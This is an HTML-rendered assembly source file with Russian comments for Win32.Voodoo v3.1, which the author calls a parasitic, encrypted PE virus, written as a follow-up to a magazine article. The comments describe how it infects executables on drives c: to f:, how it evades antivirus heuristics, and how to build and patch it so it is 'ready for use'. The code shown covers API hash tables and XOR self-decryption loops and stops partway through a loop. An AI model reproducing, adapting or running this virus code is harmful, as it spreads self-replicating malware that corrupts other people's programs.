<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>WIN32INF.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;Эта программа является продолжением статьи из прошлого номера DVL#8, где</span><span class="sc0">
</span><span class="sc1">;было разъяснено о том как получить доступ в функциям WIN32 API .</span><span class="sc0">
</span><span class="sc1">;В этой статье показывается непосредственно применение данного алгоритма, в</span><span class="sc0">
</span><span class="sc1">;котором была проведена оптимизация и устранены "баги". По моему получилось</span><span class="sc0">
</span><span class="sc1">;вполне сносно ..."прога" тестировалась под win9x и winNT кажись работает . :-)</span><span class="sc0">
</span><span class="sc1">; Теперь пару слов о алгоритме самой "проги" ... Для репродукции своего потомства</span><span class="sc0">
</span><span class="sc1">;находим подходящий PE файл и глядим если у него подходящая кодовая секция* (</span><span class="sc0">
</span><span class="sc1">;размер секции &gt;= размер "проги"). Если таковая  найдена берем ее код и дописываем </span><span class="sc0">
</span><span class="sc1">;к жертве ... а на его место прописываем свой код. Надо  еще добавить к атрибутам</span><span class="sc0">
</span><span class="sc1">;кодовой секции еще и WRITE чтобы успешно расшифроваться ... что усложняет </span><span class="sc0">
</span><span class="sc1">;антихевристику : drWeb расценивает это как WIN.EXE.Virus  :(  .</span><span class="sc0">
</span><span class="sc1">;Когда придет время отдать управление жертве мы дочитываем с конца файла код жертвы </span><span class="sc0">
</span><span class="sc1">;и отдаем управление...</span><span class="sc0">
</span><span class="sc1">; "Прога" сканирует корневые каталоги c:\..f:\ , а также "текучку".Не трогает </span><span class="sc0">
</span><span class="sc1">;каталог SYSTEM32 .</span><span class="sc0">
</span><span class="sc1">;Деструкций не несет ( покрайней мере янвных ;) ).</span><span class="sc0">
</span><span class="sc1">; *кодовая секция - объект PE файла с атрибутами EXEC+READ+write</span><span class="sc0">
</span><span class="sc1">;КОМПИЛЯЦИЯ:</span><span class="sc0">
</span><span class="sc1">;После того как сделан EXE его надо пропатчить используя прогу setwrite.exe,</span><span class="sc0">
</span><span class="sc1">;проставить атрибут WRITE на кодовую секцию. После этого он готов к употреблению ;)</span><span class="sc0">
</span><span class="sc1">;Пример: setwrite.exe win32inf.exe</span><span class="sc0">
</span><span class="sc1">;P.S.</span><span class="sc0">
</span><span class="sc1">;Мой E-mail voodoo_imishli@mail.ru. Буду рад выслушать вашу критику, вопросы,</span><span class="sc0">
</span><span class="sc1">;замечания,пожелания.</span><span class="sc0">
</span><span class="sc1">; ============================ Win32.Voodoo_v3.1 ===========================</span><span class="sc0">
</span><span class="sc1">; Program       : Voodoo v3.1</span><span class="sc0">
</span><span class="sc1">; Description   : Parasitic,crypt PE virus</span><span class="sc0">
</span><span class="sc1">; Last modified : 01.09.1999</span><span class="sc0">
</span><span class="sc1">; Purpose       : process handling under win32</span><span class="sc0">
</span><span class="sc1">; Target OS     : Win95/98/NT</span><span class="sc0">
</span><span class="sc1">; Notes         :</span><span class="sc0">
</span><span class="sc5">ImBase</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00400000h</span><span class="sc0">
</span><span class="sc5">Entyp</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00001000h</span><span class="sc0">
</span><span class="sc5">ADDC</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">ImBase</span><span class="sc4">+</span><span class="sc5">Entyp</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">DiskCount</span><span class="sc0"> </span><span class="sc9">EqU</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">FileCount</span><span class="sc0"> </span><span class="sc9">EqU</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">SYSTEM32CRC</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">04C6D9398h</span><span class="sc0">
</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc5">VirSize</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Voodoo_Ver_3_0E</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Voodoo_Ver_3_1</span><span class="sc0">
</span><span class="sc5">MemSize</span><span class="sc0"> </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc2">2300h</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32con.inc</span><span class="sc0"> </span><span class="sc1">; описание consts</span><span class="sc0">
</span><span class="sc9">.DATA</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">flag</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
</span><span class="sc5">CheckSum</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0B0966F54h</span><span class="sc0">
</span><span class="sc5">CheckSum2</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">05E5F512Fh</span><span class="sc0">
</span><span class="sc5">GlobalAllocCRC</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">01D2925FEh</span><span class="sc0">
</span><span class="sc5">GlobalLockCRC</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0BABEC79Dh</span><span class="sc0">
</span><span class="sc5">GlobalUnlockCRC</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">09EA2AB80h</span><span class="sc0">
</span><span class="sc5">GlobalFreeCRC</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0B3BDC497h</span><span class="sc0">

</span><span class="sc5">CreateFileACRC</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0FE222F03h</span><span class="sc0">
</span><span class="sc5">CreateFileMappingACRC</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0CCF0FBCBh</span><span class="sc0">
</span><span class="sc5">MapViewOfFileCRC</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0D3DED3B4h</span><span class="sc0">
</span><span class="sc5">UnmapViewOfFileCRC</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0A5ADAF97h</span><span class="sc0">
</span><span class="sc5">FlushViewOfFileCRC</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0AFBFBF98h</span><span class="sc0">
</span><span class="sc5">ReadFileCRC</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0E5E1DAC2h</span><span class="sc0">

</span><span class="sc5">CloseHandleCRC</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">02731310Dh</span><span class="sc0">
</span><span class="sc5">FindFirstFileACRC</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0315E6238h</span><span class="sc0">
</span><span class="sc5">FindNextFileACRC</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0C7F4F8CFh</span><span class="sc0">
</span><span class="sc5">SetFileAttributesACRC</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0EE2112FBh</span><span class="sc0">
</span><span class="sc5">SetFileTimeCRC</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">012211900h</span><span class="sc0">
</span><span class="sc5">GetFileSizeCRC</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">01E2D17F3h</span><span class="sc0">
</span><span class="sc5">GetCommandLineACRC</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">08CBFBF94h</span><span class="sc0">
</span><span class="sc5">lstrcpyACRC</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">001342E28h</span><span class="sc0">
</span><span class="sc5">SetFilePointerCRC</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">065676742h</span><span class="sc0">
</span><span class="sc5">GetCurrentDirectoryCRC</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0E012FECDh</span><span class="sc0">
</span><span class="sc5">SetCurrentDirectoryCRC</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">0E012FED9h</span><span class="sc0">
</span><span class="sc5">GetSystemTimeCRC</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">018271EF9h</span><span class="sc0">
</span><span class="sc5">_GlobalUnlock</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_GlobalFree</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_GlobalUnlock</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_CreateFileA</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_GlobalFree</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_CreateFileMappingA</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_CreateFileA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_MapViewOfFile</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_CreateFileMappingA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_UnmapViewOfFile</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_MapViewOfFile</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_FlushViewOfFile</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_UnmapViewOfFile</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_CloseHandle</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_FlushViewOfFile</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_FindFirstFileA</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_FindNextFileA</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_FindFirstFileA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_SetFileAttributesA</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_FindNextFileA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_SetFileTime</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_SetFileAttributesA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_GetFileSize</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_SetFileTime</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_GetCommandLineA</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_GetFileSize</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_ReadFile</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_GetCommandLineA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_lstrcpyA</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_ReadFile</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_SetFilePointer</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_lstrcpyA</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_GetCurrentDirectory</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_SetFilePointer</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_SetCurrentDirectory</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_GetCurrentDirectory</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">_GetSystemTime</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_SetCurrentDirectory</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">OldEBP</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">_GetSystemTime</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">FileSize</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">OldEBP</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">HhendleOfFile</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">FileSize</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">HhendleOfMapFile</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">HhendleOfFile</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Pointer2MapFile</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">HhendleOfMapFile</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">tag</span><span class="sc0">                 </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">Pointer2MapFile</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">SearcHandle</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">tag</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">SearcHandle2</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">SearcHandle</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">systemtime</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">SearcHandle2</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">CODEBUF</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">systemtime</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">CommandLine</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">CODEBUF</span><span class="sc4">+</span><span class="sc5">VirSize</span><span class="sc0">
</span><span class="sc5">CurDir</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">CommandLine</span><span class="sc4">+</span><span class="sc2">800</span><span class="sc0">
</span><span class="sc5">CurDir2</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">CurDir</span><span class="sc4">+</span><span class="sc2">800</span><span class="sc0">
</span><span class="sc5">Win32FindData</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">CurDir2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc2">800</span><span class="sc0">
   </span><span class="sc5">CreationTime</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">Win32FindData</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">LastAccessTime</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">CreationTime</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">LastWriteTime</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">LastAccessTime</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">files</span><span class="sc0">               </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">LastWriteTime</span><span class="sc4">+</span><span class="sc2">32</span><span class="sc0">

</span><span class="sc5">NumberOfBytesRead</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">MemSize</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc9">.CODE</span><span class="sc0">
</span><span class="sc5">@Name_Pointers_RVA</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Name_Pointers_RVA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPoint_</span><span class="sc0">
</span><span class="sc5">@GetProcAddress</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPoint_</span><span class="sc0">
</span><span class="sc5">@KernelHandle</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KernelHandle</span><span class="sc0">   </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPoint_</span><span class="sc0">
</span><span class="sc5">@_GlobalAlloc</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GlobalAlloc</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPoint_</span><span class="sc0">
</span><span class="sc5">@_GlobalLock</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_GlobalLock</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPoint_</span><span class="sc0">
</span><span class="sc5">@MemPointer</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">MemPointer</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPoint_</span><span class="sc0">
</span><span class="sc5">@NextCode</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NextCode</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPoint_</span><span class="sc0">
</span><span class="sc5">@Dirmask</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Dirmask</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPoint_</span><span class="sc0">
</span><span class="sc5">@mask</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc9">mask</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPoint_</span><span class="sc0">
</span><span class="sc5">@disk</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">disk</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPoint_</span><span class="sc0">
</span><span class="sc5">@EntryPointRVA</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPointRVA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPoint_</span><span class="sc0">
</span><span class="sc5">@ImportTable</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ImportTable</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPoint_</span><span class="sc0">
</span><span class="sc5">@EndImportTable</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndImportTable</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EntryPoint_</span><span class="sc0">
</span><span class="sc5">Voodoo_Ver_3_1</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">EntryPoint_</span><span class="sc0">
</span><span class="sc5">EntryPoint_</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;find MZ in memory</span><span class="sc0">
</span><span class="sc1">;----------------------</span><span class="sc0">
</span><span class="sc5">popravka</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CryptBegin</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Voodoo_Ver_3_1</span><span class="sc0">
</span><span class="sc5">INCAX</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@INCAX</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Voodoo_Ver_3_1</span><span class="sc0">
</span><span class="sc5">CRCcode</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@CRCcode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Voodoo_Ver_3_1</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_k</span><span class="sc0">
</span><span class="sc5">_k</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VirSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">popravka</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CryptBegin</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_k</span><span class="sc0"> </span><span class="sc1">;10h+18+6</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc5">crypt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">],</span><span class="sc2">12345678h</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">12345678h</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">k</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Voodoo_Ver_3_0E</span><span class="sc0">
</span><span class="sc5">k</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc5">@INCAX</span><span class="sc4">:</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0"> </span><span class="sc1">;add ax,cx</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc0">
</span><span class="sc5">CryptBegin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;----------------------</span><span class="sc0">
</span><span class="sc5">popravka2</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CryptBegin2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Voodoo_Ver_3_1</span><span class="sc0">
</span><span class="sc5">INCAX2</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@INCAX2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Voodoo_Ver_3_1</span><span class="sc0">
</span><span class="sc5">@CRCcode</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_k2</span><span class="sc0">
</span><span class="sc5">_k2</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VirSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">popravka2</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CryptBegin2</span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_k2</span><span class="sc0"> </span><span class="sc1">;10h+18+6</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">esp</span><span class="sc0">
</span><span class="sc5">crypt2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">],</span><span class="sc2">12345678h</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">18</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">12345678h</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">k2</span><span class="sc0">
